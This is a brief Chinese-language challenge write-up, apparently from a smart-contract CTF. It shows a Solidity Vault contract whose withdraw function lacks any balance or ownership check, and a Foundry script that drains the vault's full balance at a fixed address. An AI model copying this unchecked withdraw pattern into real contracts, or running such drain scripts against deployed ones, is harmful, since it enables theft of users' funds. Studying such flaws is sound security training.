合约代码：`Vault.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import {IVault} from "./interfaces/IVault.sol";

contract Vault is IVault {
    uint256 public totalDeposited;

    function deposit() external payable {
        totalDeposited += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    function withdraw(uint256 amount) external {
        totalDeposited -= amount;
        payable(msg.sender).transfer(amount);
        emit Withdraw(msg.sender, amount);
    }
}
```

目标是取走合约所有资金

思路：调用withdraw函数转走合约所有的钱

脚本：`Vault_hack.s.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import {Script,console} from "forge-std/Script.sol";
import {Vault} from "../src/Vault.sol";
contract Hack is Script {
	function run() external {
		vm.startBroadcast();
		
		Vault vault = Vault(0x78aC353a65d0d0AF48367c0A16eEE0fbBC00aC88);
		uint256 amount = address(vault).balance;
		vault.withdraw(amount);
		console.log(address(vault).balance);
		
		vm.stopBroadcast();
	}
}
```

